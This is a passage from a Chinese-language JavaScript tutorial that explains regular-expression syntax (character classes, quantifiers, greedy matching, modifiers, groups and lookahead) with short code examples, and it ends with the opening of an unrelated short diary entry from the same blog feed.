<h5 id="10-5-3-特殊字符"><a href="#10-5-3-特殊字符" class="headerlink" title="10.5.3 特殊字符"></a>10.5.3 特殊字符</h5><p>正则表达式对一些不能打印的特殊字符，提供了表达方法。</p>
<ul>
<li><code>\cX</code> 表示<code>Ctrl-[X]</code>，其中的<code>X</code>是<code>A</code>-<code>Z</code>之中任一个英文字母，用来匹配控制字符。</li>
<li><code>[\b]</code> 匹配退格键(U+0008)，不要与<code>\b</code>混淆。</li>
<li><code>\n</code> 匹配换行键。</li>
<li><code>\r</code> 匹配回车键。</li>
<li><code>\t</code> 匹配制表符 tab（U+0009）。</li>
<li><code>\v</code> 匹配垂直制表符（U+000B）。</li>
<li><code>\f</code> 匹配换页符（U+000C）。</li>
<li><code>\0</code> 匹配null字符（U+0000）。</li>
<li><code>\xhh</code> 匹配一个以两位十六进制数（\x00-\xFF）表示的字符。</li>
<li><code>\uhhhh</code> 匹配一个以四位十六进制数（\u0000-\uFFFF）表示的 Unicode 字符。</li>
</ul>
<h5 id="10-5-4-字符类"><a href="#10-5-4-字符类" class="headerlink" title="10.5.4 字符类"></a>10.5.4 字符类</h5><p>字符类（class）表示有一系列字符可供选择，只要匹配其中一个就可以了。所有可供选择的字符都放在方括号内，比如<code>[xyz]</code> 表示<code>x</code>、<code>y</code>、<code>z</code>之中任选一个匹配。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[abc]/.test(<span class="string">&#x27;hello world&#x27;</span>) <span class="comment">// false</span></span><br><span class="line">/[abc]/.test(<span class="string">&#x27;apple&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，字符串<code>hello world</code>不包含<code>a</code>、<code>b</code>、<code>c</code>这三个字母中的任一个，所以返回<code>false</code>；字符串<code>apple</code>包含字母<code>a</code>，所以返回<code>true</code>。<br>有两个字符在字符类中有特殊含义。</p>
<h6 id="1-脱字符（-）"><a href="#1-脱字符（-）" class="headerlink" title="(1)脱字符（^）"></a>(1)脱字符（^）</h6><p>如果方括号内的第一个字符是<code>[^]</code>，则表示除了字符类之中的字符，其他字符都可以匹配。比如，<code>[^xyz]</code>表示除了<code>x</code>、<code>y</code>、<code>z</code>之外都可以匹配。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[^abc]/.test(<span class="string">&#x27;bbc news&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/[^abc]/.test(<span class="string">&#x27;bbc&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，字符串<code>bbc news</code>包含<code>a</code>、<code>b</code>、<code>c</code>以外的其他字符，所以返回<code>true</code>；字符串<code>bbc</code>不包含<code>a</code>、<code>b</code>、<code>c</code>以外的其他字符，所以返回<code>false</code>。<br>如果方括号内没有其他字符，即只有<code>[^]</code>，就表示匹配一切字符，其中包括换行符。相比之下，点号作为元字符（<code>.</code>）是不包括换行符的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;Please yes\nmake my day!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">s.match(<span class="regexp">/yes.*day/</span>) <span class="comment">// null</span></span><br><span class="line">s.match(<span class="regexp">/yes[^]*day/</span>) <span class="comment">// [ &#x27;yes\nmake my day&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，字符串<code>s</code>含有一个换行符，点号不包括换行符，所以第一个正则表达式匹配失败；第二个正则表达式<code>[^]</code>包含一切字符，所以匹配成功。<br>注意，脱字符只有在字符类的第一个位置才有特殊含义，否则就是字面含义。</p>
<h6 id="2-连字符（-）"><a href="#2-连字符（-）" class="headerlink" title="(2)连字符（-）"></a>(2)连字符（-）</h6><p>某些情况下，对于连续序列的字符，连字符（<code>-</code>）用来提供简写形式，表示字符的连续范围。比如，<code>[abc]</code>可以写成<code>[a-c]</code>，<code>[0123456789]</code>可以写成<code>[0-9]</code>，同理<code>[A-Z]</code>表示26个大写字母。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a-z/.test(<span class="string">&#x27;b&#x27;</span>) <span class="comment">// false</span></span><br><span class="line">/[a-z]/.test(<span class="string">&#x27;b&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，当连字号（dash）不出现在方括号之中，就不具备简写的作用，只代表字面的含义，所以不匹配字符b。只有当连字号用在方括号之中，才表示连续的字符序列。</p>
<p>以下都是合法的字符类简写形式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span>-<span class="number">9.</span>,]</span><br><span class="line">[<span class="number">0</span>-9a-fA-F]</span><br><span class="line">[a-zA-Z0-<span class="number">9</span>-]</span><br><span class="line">[<span class="number">1</span>-<span class="number">31</span>]</span><br></pre></td></tr></table></figure>
<p>上面代码中最后一个字符类<code>[1-31]</code>，不代表<code>1</code>到<code>31</code>，只代表<code>1</code>到<code>3</code>。</p>
<p>连字符还可以用来指定 Unicode 字符的范围。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;\u0130\u0131\u0132&quot;</span>;</span><br><span class="line">/[\u0128-\uFFFF]/.test(str)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>\u0128-\uFFFF</code>表示匹配码点在0128到FFFF之间的所有字符。<br>另外，不要过分使用连字符，设定一个很大的范围，否则很可能选中意料之外的字符。最典型的例子就是<code>[A-z]</code>，表面上它是选中从大写的<code>A</code>到小写的<code>z</code>之间52个字母，但是由于在 ASCII 编码之中，大写字母与小写字母之间还有其他字符，结果就会出现意料之外的结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[A-z]/.test(<span class="string">&#x27;\\&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，由于反斜杠（’&#39;）的ASCII码在大写字母与小写字母之间，结果会被选中。</p>
<h5 id="10-5-5-预定义模式"><a href="#10-5-5-预定义模式" class="headerlink" title="10.5.5 预定义模式"></a>10.5.5 预定义模式</h5><p>预定义模式指的是某些常见模式的简写方式。</p>
<ul>
<li><code>\d</code> 匹配0-9之间的任一数字，相当于<code>[0-9]</code>。</li>
<li><code>\D</code> 匹配所有0-9以外的字符，相当于<code>[^0-9]</code>。</li>
<li><code>\w</code> 匹配任意的字母、数字和下划线，相当于<code>[A-Za-z0-9_]</code>。</li>
<li><code>\W</code> 除所有字母、数字和下划线以外的字符，相当于<code>[^A-Za-z0-9_]</code>。</li>
<li><code>\s</code> 匹配空格（包括换行符、制表符、空格符等），相等于<code>[ \t\r\n\v\f]</code>。</li>
<li><code>\S</code> 匹配非空格的字符，相当于<code>[^ \t\r\n\v\f]</code>。</li>
<li><code>\b</code> 匹配词的边界。</li>
<li><code>\B</code> 匹配非词边界，即在词的内部。</li>
</ul>
<p>下面是一些例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// \s 的例子</span></span><br><span class="line">/\s\w*<span class="regexp">/.exec(&#x27;hello world&#x27;) /</span><span class="regexp">/ [&quot; world&quot;]</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ \b 的例子</span></span><br><span class="line"><span class="regexp">/</span>\bworld/.test(<span class="string">&#x27;hello world&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/\bworld/.test(<span class="string">&#x27;hello-world&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/\bworld/.test(<span class="string">&#x27;helloworld&#x27;</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// \B 的例子</span></span><br><span class="line">/\Bworld/.test(<span class="string">&#x27;hello-world&#x27;</span>) <span class="comment">// false</span></span><br><span class="line">/\Bworld/.test(<span class="string">&#x27;helloworld&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>\s</code>表示空格，所以匹配结果会包括空格。<code>\b</code>表示词的边界，所以<code>world</code>的词首必须独立（词尾是否独立未指定），才会匹配。同理，<code>\B</code>表示非词的边界，只有<code>world</code>的词首不独立，才会匹配。<br>通常，正则表达式遇到换行符（<code>\n</code>）就会停止匹配。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> html = <span class="string">&quot;&lt;b&gt;Hello&lt;/b&gt;\n&lt;i&gt;world!&lt;/i&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">/.*/.exec(html)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// &quot;&lt;b&gt;Hello&lt;/b&gt;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，字符串<code>html</code>包含一个换行符，结果点字符（<code>.</code>）不匹配换行符，导致匹配结果可能不符合原意。这时使用<code>\s</code>字符类，就能包括换行符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> html = <span class="string">&quot;&lt;b&gt;Hello&lt;/b&gt;\n&lt;i&gt;world!&lt;/i&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">/[\S\s]*/.exec(html)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// &quot;&lt;b&gt;Hello&lt;/b&gt;\n&lt;i&gt;world!&lt;/i&gt;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>[\S\s]</code>指代一切字符。</p>
<h5 id="10-5-6-重复类"><a href="#10-5-6-重复类" class="headerlink" title="10.5.6 重复类"></a>10.5.6 重复类</h5><p>模式的精确匹配次数，使用大括号（<code>&#123;&#125;</code>）表示。<code>&#123;n&#125;</code>表示恰好重复<code>n</code>次，<code>&#123;n,&#125;</code>表示至少重复<code>n</code>次，<code>&#123;n,m&#125;</code>表示重复不少于<code>n</code>次，不多于<code>m</code>次。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/lo&#123;<span class="number">2</span>&#125;k/.test(<span class="string">&#x27;look&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/lo&#123;<span class="number">2</span>,<span class="number">5</span>&#125;k/.test(<span class="string">&#x27;looook&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，第一个模式指定<code>o</code>连续出现2次，第二个模式指定<code>o</code>连续出现2次到5次之间。</p>
<h5 id="10-5-7-量词符"><a href="#10-5-7-量词符" class="headerlink" title="10.5.7 量词符"></a>10.5.7 量词符</h5><p>量词符用来设定某个模式出现的次数。</p>
<ul>
<li><code>?</code> 问号表示某个模式出现0次或1次，等同于<code>&#123;0, 1&#125;</code>。</li>
<li><code>*</code> 星号表示某个模式出现0次或多次，等同于<code>&#123;0,&#125;</code>。</li>
<li><code>+</code> 加号表示某个模式出现1次或多次，等同于<code>&#123;1,&#125;</code>。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// t 出现0次或1次</span></span><br><span class="line">/t?est/.test(<span class="string">&#x27;test&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/t?est/.test(<span class="string">&#x27;est&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// t 出现1次或多次</span></span><br><span class="line">/t+est/.test(<span class="string">&#x27;test&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/t+est/.test(<span class="string">&#x27;ttest&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/t+est/.test(<span class="string">&#x27;est&#x27;</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// t 出现0次或多次</span></span><br><span class="line">/t*est/.test(<span class="string">&#x27;test&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/t*est/.test(<span class="string">&#x27;ttest&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/t*est/.test(<span class="string">&#x27;tttest&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/t*est/.test(<span class="string">&#x27;est&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h5 id="10-5-8-贪婪模式"><a href="#10-5-8-贪婪模式" class="headerlink" title="10.5.8 贪婪模式"></a>10.5.8 贪婪模式</h5><p>上一小节的三个量词符，默认情况下都是最大可能匹配，即匹配到下一个字符不满足匹配规则为止。这被称为贪婪模式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">s.match(<span class="regexp">/a+/</span>) <span class="comment">// [&quot;aaa&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，模式是<code>/a+/</code>，表示匹配1个<code>a</code>或多个<code>a</code>，那么到底会匹配几个<code>a</code>呢？因为默认是贪婪模式，会一直匹配到字符<code>a</code>不出现为止，所以匹配结果是3个<code>a</code>。<br>除了贪婪模式，还有非贪婪模式，即最小可能匹配。只要一发现匹配，就返回结果，不要往下检查。如果想将贪婪模式改为非贪婪模式，可以在量词符后面加一个问号。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">s.match(<span class="regexp">/a+?/</span>) <span class="comment">// [&quot;a&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，模式结尾添加了一个问号<code>/a+?/</code>，这时就改为非贪婪模式，一旦条件满足，就不再往下匹配，<code>+?</code>表示只要发现一个<code>a</code>，就不再往下匹配了。<br>除了非贪婪模式的加号（<code>+?</code>），还有非贪婪模式的星号（<code>*?</code>）和非贪婪模式的问号（<code>??</code>）。</p>
<ul>
<li><code>+?</code>：表示某个模式出现1次或多次，匹配时采用非贪婪模式。</li>
<li><code>*?</code>：表示某个模式出现0次或多次，匹配时采用非贪婪模式。</li>
<li><code>??</code>：表格某个模式出现0次或1次，匹配时采用非贪婪模式。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;abb&#x27;</span>.match(<span class="regexp">/ab*/</span>) <span class="comment">// [&quot;abb&quot;]</span></span><br><span class="line"><span class="string">&#x27;abb&#x27;</span>.match(<span class="regexp">/ab*?/</span>) <span class="comment">// [&quot;a&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;abb&#x27;</span>.match(<span class="regexp">/ab?/</span>) <span class="comment">// [&quot;ab&quot;]</span></span><br><span class="line"><span class="string">&#x27;abb&#x27;</span>.match(<span class="regexp">/ab??/</span>) <span class="comment">// [&quot;a&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，<code>/ab*/</code>表示如果<code>a</code>后面有多个<code>b</code>，那么匹配尽可能多的<code>b</code>；<code>/ab*?/</code>表示匹配尽可能少的<code>b</code>，也就是0个<code>b</code>。</p>
<h5 id="10-5-9-修饰符"><a href="#10-5-9-修饰符" class="headerlink" title="10.5.9 修饰符"></a>10.5.9 修饰符</h5><p>修饰符（modifier）表示模式的附加规则，放在正则模式的最尾部。</p>
<p>修饰符可以单个使用，也可以多个一起使用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单个修饰符</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/test/i</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多个修饰符</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/test/ig</span>;</span><br></pre></td></tr></table></figure>
<h6 id="1-g-修饰符"><a href="#1-g-修饰符" class="headerlink" title="(1)g 修饰符"></a>(1)g 修饰符</h6><p>默认情况下，第一次匹配成功后，正则对象就停止向下匹配了。<code>g</code>修饰符表示全局匹配（global），加上它以后，正则对象将匹配全部符合条件的结果，主要用于搜索和替换。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/b/</span>;</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;abba&#x27;</span>;</span><br><span class="line"></span><br><span class="line">regex.test(str); <span class="comment">// true</span></span><br><span class="line">regex.test(str); <span class="comment">// true</span></span><br><span class="line">regex.test(str); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，正则模式不含<code>g</code>修饰符，每次都是从字符串头部开始匹配。所以，连续做了三次匹配，都返回<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/b/g</span>;</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;abba&#x27;</span>;</span><br><span class="line"></span><br><span class="line">regex.test(str); <span class="comment">// true</span></span><br><span class="line">regex.test(str); <span class="comment">// true</span></span><br><span class="line">regex.test(str); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，正则模式含有<code>g</code>修饰符，每次都是从上一次匹配成功处，开始向后匹配。因为字符串<code>abba</code>只有两个<code>b</code>，所以前两次匹配结果为<code>true</code>，第三次匹配结果为<code>false</code>。</p>
<h6 id="2-i-修饰符"><a href="#2-i-修饰符" class="headerlink" title="(2)i 修饰符"></a>(2)i 修饰符</h6><p>默认情况下，正则对象区分字母的大小写，加上<code>i</code>修饰符以后表示忽略大小写（ignoreCase）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/abc/.test(<span class="string">&#x27;ABC&#x27;</span>) <span class="comment">// false</span></span><br><span class="line">/abc/i.test(<span class="string">&#x27;ABC&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，加了<code>i</code>修饰符以后，不考虑大小写，所以模式<code>abc</code>匹配字符串<code>ABC</code>。</p>
<h6 id="3-m-修饰符"><a href="#3-m-修饰符" class="headerlink" title="(3)m 修饰符"></a>(3)m 修饰符</h6><p><code>m</code>修饰符表示多行模式（multiline），会修改<code>^</code>和<code>$</code>的行为。默认情况下（即不加<code>m</code>修饰符时），<code>^</code>和<code>$</code>匹配字符串的开始处和结尾处，加上<code>m</code>修饰符以后，<code>^</code>和<code>$</code>还会匹配行首和行尾，即<code>^</code>和<code>$</code>会识别换行符（<code>\n</code>）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/world$/.test(<span class="string">&#x27;hello world\n&#x27;</span>) <span class="comment">// false</span></span><br><span class="line">/world$/m.test(<span class="string">&#x27;hello world\n&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面的代码中，字符串结尾处有一个换行符。如果不加<code>m</code>修饰符，匹配不成功，因为字符串的结尾不是<code>world</code>；加上以后，<code>$</code>可以匹配行尾。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/^b/m.test(<span class="string">&#x27;a\nb&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码要求匹配行首的<code>b</code>，如果不加<code>m</code>修饰符，就相当于<code>b</code>只能处在字符串的开始处。加上<code>m</code>修饰符以后，换行符<code>\n</code>也会被认为是一行的开始。</p>
<h5 id="10-5-10-组匹配"><a href="#10-5-10-组匹配" class="headerlink" title="10.5.10 组匹配"></a>10.5.10 组匹配</h5><h6 id="1-概述"><a href="#1-概述" class="headerlink" title="(1)概述"></a>(1)概述</h6><p>正则表达式的括号表示分组匹配，括号中的模式可以用来匹配分组的内容。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/fred+<span class="regexp">/.test(&#x27;fredd&#x27;) /</span><span class="regexp">/ true</span></span><br><span class="line"><span class="regexp">/</span>(fred)+<span class="regexp">/.test(&#x27;fredfred&#x27;) /</span><span class="regexp">/ true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，第一个模式没有括号，结果<code>+</code>只表示重复字母<code>d</code>，第二个模式有括号，结果<code>+</code>就表示匹配<code>fred</code>这个词。<br>下面是另外一个分组捕获的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="string">&#x27;abcabc&#x27;</span>.match(<span class="regexp">/(.)b(.)/</span>);</span><br><span class="line">m</span><br><span class="line"><span class="comment">// [&#x27;abc&#x27;, &#x27;a&#x27;, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，正则表达式<code>/(.)b(.)/</code>一共使用两个括号，第一个括号捕获<code>a</code>，第二个括号捕获<code>c</code>。</p>
<p>注意，使用组匹配时，不宜同时使用<code>g</code>修饰符，否则<code>match</code>方法不会捕获分组的内容。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="string">&#x27;abcabc&#x27;</span>.match(<span class="regexp">/(.)b(.)/g</span>);</span><br><span class="line">m <span class="comment">// [&#x27;abc&#x27;, &#x27;abc&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码使用带<code>g</code>修饰符的正则表达式，结果<code>match</code>方法只捕获了匹配整个表达式的部分。这时必须使用正则表达式的<code>exec</code>方法，配合循环，才能读到每一轮匹配的组捕获。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;abcabc&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/(.)b(.)/g</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> result = reg.exec(str);</span><br><span class="line">  <span class="keyword">if</span> (!result) <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [&quot;abc&quot;, &quot;a&quot;, &quot;c&quot;]</span></span><br><span class="line"><span class="comment">// [&quot;abc&quot;, &quot;a&quot;, &quot;c&quot;]</span></span><br></pre></td></tr></table></figure>
<p>正则表达式内部，还可以用<code>\n</code>引用括号匹配的内容，<code>n</code>是从1开始的自然数，表示对应顺序的括号。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/(.)b(.)\1b\<span class="number">2</span>/.test(<span class="string">&quot;abcabc&quot;</span>)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面的代码中，<code>\1</code>表示第一个括号匹配的内容（即<code>a</code>），<code>\2</code>表示第二个括号匹配的内容（即<code>c</code>）。</p>
<p>下面是另外一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/y(..)(.)\<span class="number">2</span>\<span class="number">1</span>/.test(<span class="string">&#x27;yabccab&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>括号还可以嵌套。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/y((..)\<span class="number">2</span>)\<span class="number">1</span>/.test(<span class="string">&#x27;yabababab&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>\1</code>指向外层括号，<code>\2</code>指向内层括号。<br>组匹配非常有用，下面是一个匹配网页标签的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tagName = <span class="regexp">/&lt;([^&gt;]+)&gt;[^&lt;]*&lt;\/\1&gt;/</span>;</span><br><span class="line"></span><br><span class="line">tagName.exec(<span class="string">&quot;&lt;b&gt;bold&lt;/b&gt;&quot;</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="comment">// &#x27;b&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，圆括号匹配尖括号之中的标签，而<code>\1</code>就表示对应的闭合标签。</p>
<p>上面代码略加修改，就能捕获带有属性的标签。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> html = <span class="string">&#x27;&lt;b class=&quot;hello&quot;&gt;Hello&lt;/b&gt;&lt;i&gt;world&lt;/i&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> tag = <span class="regexp">/&lt;(\w+)([^&gt;]*)&gt;(.*?)&lt;\/\1&gt;/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> match = tag.exec(html);</span><br><span class="line"></span><br><span class="line">match[<span class="number">1</span>] <span class="comment">// &quot;b&quot;</span></span><br><span class="line">match[<span class="number">2</span>] <span class="comment">// &quot; class=&quot;hello&quot;&quot;</span></span><br><span class="line">match[<span class="number">3</span>] <span class="comment">// &quot;Hello&quot;</span></span><br><span class="line"></span><br><span class="line">match = tag.exec(html);</span><br><span class="line"></span><br><span class="line">match[<span class="number">1</span>] <span class="comment">// &quot;i&quot;</span></span><br><span class="line">match[<span class="number">2</span>] <span class="comment">// &quot;&quot;</span></span><br><span class="line">match[<span class="number">3</span>] <span class="comment">// &quot;world&quot;</span></span><br></pre></td></tr></table></figure>
<h6 id="2-非捕获组"><a href="#2-非捕获组" class="headerlink" title="(2)非捕获组"></a>(2)非捕获组</h6><p><code>(?:x)</code>称为非捕获组（Non-capturing group），表示不返回该组匹配的内容，即匹配的结果中不计入这个括号。</p>
<p>非捕获组的作用请考虑这样一个场景，假定需要匹配<code>foo</code>或者<code>foofoo</code>，正则表达式就应该写成<code>/(foo)&#123;1, 2&#125;/</code>，但是这样会占用一个组匹配。这时，就可以使用非捕获组，将正则表达式改为<code>/(?:foo)&#123;1, 2&#125;/</code>，它的作用与前一个正则是一样的，但是不会单独输出括号内部的内容。</p>
<p>请看下面的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="string">&#x27;abc&#x27;</span>.match(<span class="regexp">/(?:.)b(.)/</span>);</span><br><span class="line">m <span class="comment">// [&quot;abc&quot;, &quot;c&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中的模式，一共使用了两个括号。其中第一个括号是非捕获组，所以最后返回的结果中没有第一个括号，只有第二个括号匹配的内容。</p>
<p>下面是用来分解网址的正则表达式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正常匹配</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="regexp">/(http|ftp):\/\/([^/\r\n]+)(\/[^\r\n]*)?/</span>;</span><br><span class="line"></span><br><span class="line">url.exec(<span class="string">&#x27;http://google.com/&#x27;</span>);</span><br><span class="line"><span class="comment">// [&quot;http://google.com/&quot;, &quot;http&quot;, &quot;google.com&quot;, &quot;/&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 非捕获组匹配</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="regexp">/(?:http|ftp):\/\/([^/\r\n]+)(\/[^\r\n]*)?/</span>;</span><br><span class="line"></span><br><span class="line">url.exec(<span class="string">&#x27;http://google.com/&#x27;</span>);</span><br><span class="line"><span class="comment">// [&quot;http://google.com/&quot;, &quot;google.com&quot;, &quot;/&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面的代码中，前一个正则表达式是正常匹配，第一个括号返回网络协议；后一个正则表达式是非捕获匹配，返回结果中不包括网络协议。</p>
<h6 id="3-先行断言"><a href="#3-先行断言" class="headerlink" title="(3)先行断言"></a>(3)先行断言</h6><p><code>x(?=y)</code>称为先行断言（Positive look-ahead），<code>x</code>只有在<code>y</code>前面才匹配，<code>y</code>不会被计入返回结果。比如，要匹配后面跟着百分号的数字，可以写成<code>/\d+(?=%)/</code>。</p>
<p>“先行断言”中，括号里的部分是不会返回的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="string">&#x27;abc&#x27;</span>.match(<span class="regexp">/b(?=c)/</span>);</span><br><span class="line">m <span class="comment">// [&quot;b&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面的代码使用了先行断言，<code>b</code>在<code>c</code>前面所以被匹配，但是括号对应的<code>c</code>不会被返回。</p>
<h6 id="4-先行否定断言"><a href="#4-先行否定断言" class="headerlink" title="(4)先行否定断言"></a>(4)先行否定断言</h6><p><code>x(?!y)</code>称为先行否定断言（Negative look-ahead），<code>x</code>只有不在<code>y</code>前面才匹配，<code>y</code>不会被计入返回结果。比如，要匹配后面跟的不是百分号的数字，就要写成<code>/\d+(?!%)/</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/\d+(?!\.)/.exec(<span class="string">&#x27;3.14&#x27;</span>)</span><br><span class="line"><span class="comment">// [&quot;14&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，正则表达式指定，只有不在小数点前面的数字才会被匹配，因此返回的结果就是14。</p>
<p>“先行否定断言”中，括号里的部分是不会返回的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="string">&#x27;abd&#x27;</span>.match(<span class="regexp">/b(?!c)/</span>);</span><br><span class="line">m <span class="comment">// [&#x27;b&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>上面的代码使用了先行否定断言，<code>b</code>不在<code>c</code>前面所以被匹配，而且括号对应的<code>d</code>不会被返回。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS标准库-RegExp对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0027</title>
    <url>/2021/05/17/%E6%89%93%E5%8D%A10027/</url>
    <content><![CDATA[<p><font color=#73b9a2>走在未知的道路上，不能停也不能回头。</font></p>
